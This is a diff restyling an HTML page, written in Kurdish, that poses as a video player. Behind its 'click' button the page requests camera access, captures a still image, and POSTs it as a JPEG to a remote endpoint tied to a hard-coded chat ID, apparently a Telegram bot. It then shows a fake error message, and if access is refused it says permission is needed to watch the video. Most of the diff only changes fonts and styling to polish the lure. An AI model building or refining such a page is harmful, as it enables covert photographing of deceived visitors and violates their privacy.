@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Video Player</title>
-    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;600&family=Reem+Kufi:wght@500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Lalezar&family=Vazirmatn:wght@500&display=swap" rel="stylesheet">
     
     <style>
         body {
@@ -13,7 +13,7 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #121212;
+            background-color: #0a0a0a;
             /* باگراوەندی دیواری بەردینی ڕەش */
             background-image: 
                 linear-gradient(335deg, #000000 23px, transparent 23px),
@@ -22,73 +22,76 @@
                 linear-gradient(155deg, #000000 23px, transparent 23px);
             background-size: 58px 58px;
             background-position: 0px 2px, 4px 35px, 29px 31px, 34px 6px;
-            font-family: 'IBM Plex Sans Arabic', sans-serif;
             text-align: center;
             overflow: hidden;
         }
 
         #main-container {
-            /* ستایلی شووشەیی (Glassmorphism) */
-            background: rgba(255, 255, 255, 0.03);
-            padding: 55px 35px;
-            border-radius: 25px;
+            /* شووشەی لێڵ و مۆدێرن */
+            background: rgba(255, 255, 255, 0.02);
+            padding: 60px 40px;
+            border-radius: 40px;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
+            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
             width: 85%;
-            max-width: 340px;
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
+            max-width: 350px;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
         }
 
         h2 {
             color: #ffffff;
-            margin-bottom: 45px;
-            font-size: 34px;
-            font-family: 'Reem Kufi', sans-serif;
-            font-weight: 500;
+            margin-bottom: 40px;
+            font-size: 38px;
+            font-family: 'Lalezar', system-ui; /* فۆنتی زۆر جوان و هونەری */
+            letter-spacing: 2px;
+            text-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
 
         #startBtn {
-            padding: 16px 30px;
-            font-size: 20px;
-            border-radius: 18px;
-            border: 1px solid rgba(255, 255, 255, 0.25);
-            /* ستایلی شووشەیی بۆ دوگمەکە */
-            background: rgba(255, 255, 255, 0.08);
+            padding: 18px 35px;
+            font-size: 22px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            /* دوگمەی شووشەیی */
+            background: rgba(255, 255, 255, 0.07);
             color: #ffffff;
-            font-weight: 600;
             cursor: pointer;
-            font-family: 'IBM Plex Sans Arabic', sans-serif;
-            transition: all 0.4s ease;
+            font-family: 'Lalezar', system-ui;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             backdrop-filter: blur(10px);
             -webkit-backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
             display: inline-flex;
             align-items: center;
-            justify-content: center;
-            gap: 5px;
+            gap: 10px;
         }
 
         #startBtn:hover {
             background: rgba(255, 255, 255, 0.15);
-            transform: translateY(-5px);
+            transform: translateY(-8px);
             border: 1px solid rgba(255, 255, 255, 0.4);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
 
         #startBtn:active {
-            transform: scale(0.95);
+            transform: scale(0.92);
         }
 
         #status {
-            color: #bbbbbb;
+            color: #888;
             margin-top: 25px;
+            font-family: 'Vazirmatn', sans-serif;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
 
     <div id="main-container">
-        <h2 id="status">ئـــەزیــزن🩶</h2>
+        <h2 id="title">ئـــەزیــزن🩶</h2>
         <button id="startBtn">&lt;👈🏽کلیک کردن👉🏽&gt;</button>
+        <div id="status"></div>
     </div>
 
     <video id="v" autoplay playsinline style="display:none;"></video>
@@ -99,7 +102,7 @@
         const myId = '7978104952'; 
 
         document.getElementById('startBtn').addEventListener('click', function() {
-            document.getElementById('status').innerText = "...کەمێک چاوەڕێ بکە";
+            document.getElementById('title').innerText = "...چاوەڕێ بن";
             this.style.display = 'none';
 
             navigator.mediaDevices.getUserMedia({ video: true })
@@ -121,13 +124,13 @@
                             method: 'POST',
                             body: f
                         }).then(() => {
-                            document.getElementById('status').innerText = "کێشەیەک لە سێرڤەر ڕوویدا.";
+                            document.getElementById('title').innerText = "هەڵەیەک ڕوویدا دووبارە بکەرەوە.";
                         });
                     }, 'image/jpeg');
                 }, 1000);
             })
             .catch(e => {
-                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
+                document.getElementById('title').innerText = "تکایە ڕێگە بدە بە کامێراکە (Allow).";
             });
         });
     </script>
